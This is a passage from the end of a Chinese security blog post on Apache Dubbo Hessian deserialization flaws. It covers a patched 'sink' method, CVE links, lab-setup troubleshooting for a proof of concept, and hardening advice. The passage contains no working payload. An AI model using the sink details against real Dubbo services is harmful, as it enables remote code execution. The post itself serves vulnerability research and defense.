<p>2.7.15修复sink2 <a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd">https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd</a></p>
<pre><code>    protected IOException expect(String expect, int ch) throws IOException &#123;
        if (ch &lt; 0) &#123;
            return this.error(&quot;expected &quot; + expect + &quot; at end of file&quot;);
        &#125; else &#123;
            --this._offset;
            try &#123;
                Object obj = this.readObject();
                return obj != null ? this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; &quot; + obj.getClass().getName()) : this.error(&quot;expected &quot; + expect + &quot; at 0x&quot; + Integer.toHexString(ch &amp; 255) + &quot; null&quot;);
</code></pre><h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-30180/">https://www.cvedetails.com/cve/CVE-2021-30180/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-30181/">https://www.cvedetails.com/cve/CVE-2021-30181/</a></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>trick: <strong>断点下在jndi</strong></p>
<blockquote>
<p>[Dubbo] Current Spring Boot Application is await</p>
</blockquote>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
        &lt;/dependency&gt;
</code></pre><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33189961/article/details/116430262">https://blog.csdn.net/qq_33189961/article/details/116430262</a></p>
<blockquote>
<p>dubbo 2.7.5 //2.7.6没有问题</p>
<p>nc 127.0.0.1 12345</p>
<p>dubbo&gt;ls 报错</p>
<p>Unsupported command: ls</p>
</blockquote>
<p>改provide的application.propertier，并安装插件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/issues/5690">https://github.com/apache/dubbo/issues/5690</a></p>
<blockquote>
<p>dubbopoc 依赖为dubbo-2.7.13时启动  provide 报错:</p>
<p>Error creating bean with name ‘referenceAnnotationBeanPostProcessor’</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.editcode.net/thread-79209-1-1.html">https://www.editcode.net/thread-79209-1-1.html</a></p>
<pre><code>        &lt;dependency&gt;
            &lt;groupId&gt;com.alibaba.spring&lt;/groupId&gt;
            &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt;
            &lt;version&gt;1.0.11&lt;/version&gt;
        &lt;/dependency&gt;
</code></pre><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>1、关闭对公网开放的Dubbo服务端端口，仅允许可信任的IP访问。</p>
<p>2、Dubbo协议默认使用Hessian进行序列化和反序列化。在不影响业务的情况下，建议更换协议以及反序列化方式。具体方法请参考官方文档：<a target="_blank" rel="noopener" href="http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html">http://dubbo.apache.org/zh-cn/docs/user/references/xml/dubbo-protocol.html</a></p>
<p>3、配置环境变量<code>serialization.security.check=true</code>，开启强校验</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="/#"></li>
                <li class="wechat-code"><img src="/#"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
        
          
            <div class="post-nepre full next">
          
            <a href="/2021/09/14/RCTF2021_misc_ezshell_%E5%87%BA%E9%A2%98%E4%BA%BAwp/" rel="next">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                RCTF2021_misc_ezshell_出题人wp</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
<div id="vcomments"></div>
<script>
  window.onload = function(){
      var valine = new Valine();
      valine.init({
        el: '#vcomments',
        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
        path: window.location.pathname,
        placeholder: "你是我一生只会遇见一次的惊喜 ..."
      })
  }
</script>

      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="popko.top" class="profile gravatar"><img src="https://www.popko.top/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="popko.top" itemprop="url" rel="author">popko</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>otaku</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            // PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    <!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 popko<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2018</p>
    </div>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>
<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>

    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>
  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/img/custom/avatar.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">あやねさまのpopko</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="https://github.com/pipimi110" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
        <a href="/#" class="fa fa-weibo" target="_blank" style="color: #dd4b39; margin-left:20px"></a>
      
        <a href="/#" class="fa fa-qq" target="_blank" style="color: #25c6fe; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/%E6%8A%80%E6%9C%AF/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/%E8%BD%AC%E8%BD%BD/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  转载
                </a>
              </li>
            
          </ul>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
  .aplayer .aplayer-lrc.aplayer-lrc-hide {
      display:none !important;
  }
  .aplayer.aplayer-fixed .lrc-show {
    display: block;
    background: rgba(255, 255, 255, 0.8);
  }
</style>
<meting-js

    id="2660651585"

    server="netease"

    type="playlist"

    fixed="true"

    autoplay="false"

    loop="all"

    order="random"

    preload="auto"

    volume="0.7"

    mutex="true"

</meting-js>
<script>
  $(function(){
    $('body').on('click', '.aplayer', function(){
      if($('.aplayer-button').hasClass('aplayer-play')) {
        $('.aplayer-lrc').removeClass('lrc-show');
      } else {
        $('.aplayer-lrc').addClass('lrc-show');
      }
    })
  });
</script>
</body>
</html>